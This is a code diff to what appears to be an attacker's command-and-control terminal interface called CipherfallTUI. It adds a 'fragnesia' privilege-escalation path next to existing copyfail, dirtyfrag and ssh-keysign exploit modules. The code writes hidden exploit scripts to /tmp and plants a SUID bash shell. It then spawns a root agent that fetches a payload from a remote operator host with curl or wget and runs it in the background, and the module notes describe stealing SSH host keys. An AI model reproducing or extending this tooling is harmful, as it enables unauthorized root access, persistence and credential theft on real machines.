@@ -689,13 +689,8 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         if not src.exists():
             return None
         b64 = base64.b64encode(src.read_bytes()).decode()
-        return (
-            f"T=/tmp/.{tag}fg.sh; "
-            f"printf '%s' '{b64}' | base64 -d > $T; "
-            f"printf 'id; exit\\n' | bash $T 2>&1; "
-            f"echo '[fragnesia:note] namespace-only — use relay for interactive exploit'; "
-            f"rm -f $T"
-        )
+        rpath = f"/tmp/.{tag}fg.sh"
+        return f"WRITE:{rpath}:{b64}"
     return None
 
 
@@ -705,6 +700,10 @@ def _build_copyfail_exec(bd: str, rpath: str) -> str:
         f"if [ -u \"$BD\" ]; then $BD -p -c 'id'; "
         f"else echo '[privesc:fail] copyfail'; fi"
     )
+
+
+def _build_fragnesia_exec(rpath: str) -> str:
+    return f"bash {rpath} 2>&1; rm -f {rpath}"
 
 
 def _build_privesc_auto(tag: str) -> "str | None":
@@ -855,9 +854,10 @@ _MODULE_DOCS: "dict[str, tuple[str, str]]" = {
   copyfail     AF_ALG+KTLS splice overwrite /bin/su → root shell (Python ≥ 3.10)
   dirtyfrag    xfrm/RxRPC page-cache write  overwrite /usr/bin/su → root shell
   ssh-keysign  race pidfd_getfd on ssh-keysign exit → steals SSH host keys (read-only)
-  fragnesia    user+net namespace setup (CVE-2026-46300 wrapper, interactive only)
+  fragnesia    user+net namespace escalation → spawns root agent inside namespace (uid=0, namespace-scoped)
 
   On success (copyfail/dirtyfrag): plants SUID bash at /tmp/.b<tag>, runs id.
+  On success (fragnesia): spawns root agent via unshare — uid=0 inside namespace only.
   On failure: reports [privesc:fail] for each attempted exploit.
   Root not required to run — exploit escalates from unprivileged user.
 
@@ -1180,9 +1180,10 @@ class CipherfallTUI(App):
         if self._selected_task:
             await self._show_output(self._selected_task)
 
-    async def _spawn_root_agent(self, agent_id: str, tag: str) -> None:
+    async def _spawn_root_agent(self, agent_id: str, tag: str, exploit: str = "") -> None:
         log = self.query_one("#output-log", OutputTextArea)
         bd  = f"/tmp/.b{tag}"
+        shell_root = "unshare --user --map-root-user --net -- bash" if exploit == "fragnesia" else f"{bd} -p"
         base_url = self._agent_base.get(agent_id, BASE)
         try:
             async with httpx.AsyncClient() as c:
@@ -1263,7 +1264,7 @@ class CipherfallTUI(App):
             )
             _launch_b64 = base64.b64encode(_launch_src.encode()).decode()
             spawn_cmd = (
-                f"{bd} -p -c '"
+                f"{shell_root} -c '"
                 f"PATH=/usr/bin:/bin:/usr/sbin:/sbin:$PATH; "
                 f"curl -sfo {ra} http://{host}/{served_name} "
                 f"|| wget -qO {ra} http://{host}/{served_name}; "
@@ -1274,7 +1275,7 @@ class CipherfallTUI(App):
             agent_b64 = base64.b64encode(agent_text.encode()).decode()
             spawn_cmd = (
                 f"printf '%s' '{agent_b64}' | base64 -d > {ra}; "
-                f"{bd} -p -c 'nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
+                f"{shell_root} -c 'nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
                 f"echo '[rootagent:spawned]'"
             )
         try:
@@ -1366,12 +1367,17 @@ class CipherfallTUI(App):
             out = task.get("output") or ""
             if px.get("type") == "privesc_write":
                 if "written" in out:
-                    rp       = px["remote_path"]
-                    bd       = f"/tmp/.b{px['tag']}"
-                    aid      = px["agent_id"]
-                    bu       = self._agent_base.get(aid, BASE)
-                    exec_cmd = _build_copyfail_exec(bd, rp)
-                    log.write("[yellow]upload done — launching copyfail…[/yellow]")
+                    rp      = px["remote_path"]
+                    bd      = f"/tmp/.b{px['tag']}"
+                    aid     = px["agent_id"]
+                    bu      = self._agent_base.get(aid, BASE)
+                    exploit = px["exploit"]
+                    if exploit == "fragnesia":
+                        exec_cmd = _build_fragnesia_exec(rp)
+                        log.write("[yellow]upload done — launching fragnesia…[/yellow]")
+                    else:
+                        exec_cmd = _build_copyfail_exec(bd, rp)
+                        log.write("[yellow]upload done — launching copyfail…[/yellow]")
                     try:
                         async with httpx.AsyncClient() as c:
                             r2 = await c.post(f"{bu}/admin/task",
@@ -1380,7 +1386,7 @@ class CipherfallTUI(App):
                             res = r2.json()
                         self._privesc_tasks[res["task_id"]] = {
                             "type":     "privesc_exec",
-                            "exploit":  px["exploit"],
+                            "exploit":  exploit,
                             "agent_id": aid,
                             "tag":      px["tag"],
                         }
@@ -1391,14 +1397,18 @@ class CipherfallTUI(App):
                 elif out:
                     log.write(f"[red]upload error: {out[:200]}[/red]")
                 else:
-                    log.write("[dim]uploading copyfail…[/dim]")
+                    log.write(f"[dim]uploading {px['exploit']}…[/dim]")
                 return
             if out:
                 log.write_raw(out.strip())
                 if "[privesc:ok]" in out and task_id not in self._root_spawned:
                     self._root_spawned.add(task_id)
-                    log.write("[bold green]root obtained — SUID bash planted — spawning root agent…[/bold green]")
-                    asyncio.create_task(self._spawn_root_agent(px["agent_id"], px["tag"]))
+                    exploit = px.get("exploit", "")
+                    if exploit == "fragnesia":
+                        log.write("[bold green]user namespace root — spawning agent in namespace…[/bold green]")
+                    else:
+                        log.write("[bold green]root obtained — SUID bash planted — spawning root agent…[/bold green]")
+                    asyncio.create_task(self._spawn_root_agent(px["agent_id"], px["tag"], exploit))
                 elif "[ssh-keysign:ok]" in out:
                     log.write("[bold green]ssh-keysign: host keys extracted[/bold green]")
                 elif "[privesc:fail] all" in out:
@@ -1798,6 +1808,9 @@ class CipherfallTUI(App):
             if exploit == "copyfail":
                 px_entry["type"]        = "privesc_write"
                 px_entry["remote_path"] = f"/tmp/.{tag}cf.py"
+            elif exploit == "fragnesia":
+                px_entry["type"]        = "privesc_write"
+                px_entry["remote_path"] = f"/tmp/.{tag}fg.sh"
             self._privesc_tasks[result["task_id"]] = px_entry
             self._selected_task = result["task_id"]
             log.clear()
